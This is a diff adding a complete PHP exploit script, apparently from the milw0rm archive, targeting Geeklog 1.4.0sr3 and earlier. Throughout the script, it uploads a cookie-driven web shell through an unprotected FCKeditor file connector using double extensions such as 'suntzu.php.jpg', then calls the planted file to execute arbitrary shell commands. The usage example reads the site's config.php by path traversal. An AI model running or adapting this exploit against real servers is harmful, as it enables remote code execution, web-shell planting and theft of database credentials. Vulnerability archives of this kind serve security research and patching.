@@ -1,0 +1,140 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "Geeklog <= 1.4.0sr3 'f(u)ckeditor' remote commands execution\n";
+echo "by rgod rgod@autistici.org\n";
+echo "site: http://retrogod.altervista.org\n";
+
+//works regardless of any php.ini settings,
+//fckeditor (very old 'mcpuk' version...) is enabled by default,
+//and connector.php not protected,
+//you can upload multiple extensions files...
+
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." host path cmd OPTIONS\n";
+echo "host:      target server (ip/hostname)\n";
+echo "path:      path to geeklog\n";
+echo "cmd:       a shell command\n";
+echo "Options:\n";
+echo "   -p[port]:    specify a port other than 80\n";
+echo "   -P[ip:port]: specify a proxy\n";
+echo "Example:\n";
+echo "php ".$argv[0]." localhost / cat ./../../../../config.php\n";
+die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+$cmd="";
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$shell="<?php echo chr(72).\"i Master!\";if(get_magic_quotes_gpc()){\$_COOKIE[\"cmd\"]=stripslashes(\$_COOKIE[\"cmd\"]);}";
+$shell.="ini_set(\"max_execution_time\",0);error_reporting(0);";
+$shell.="echo \"*delim*\";passthru(\$_COOKIE[\"cmd\"]);?>";
+$allowed_extensions = array("zip","doc","xls","pdf","rtf","csv","jpg","gif","jpeg","png","avi","mpg","mpeg","swf","fla");
+for ($i=0; $i<=count($allowed_extensions)-1; $i++){
+$filename="suntzu.php.".$allowed_extensions[$i];
+$data="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"NewFile\"; filename=\"$filename\"\r\n";
+$data.="Content-Type:\r\n\r\n";
+$data.="$shell\r\n";
+$data.="-----------------------------7d529a1d23092a--\r\n";
+$packet="POST ".$p."fckeditor/editor/filemanager/browser/mcpuk/connectors/php/connector.php?Command=FileUpload&Type=File HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+$packet="GET ".$p."images/library/File/".$filename." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: cmd=".$cmd."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (eregi("Hi Master!",$html)){
+echo"Exploit succeeded...!\n";
+$temp=explode("*delim*",$html);
+die($temp[1]);}
+}
+//if you are here...
+echo "Exploit failed...";
+?>
+
+# milw0rm.com [2006-06-29]
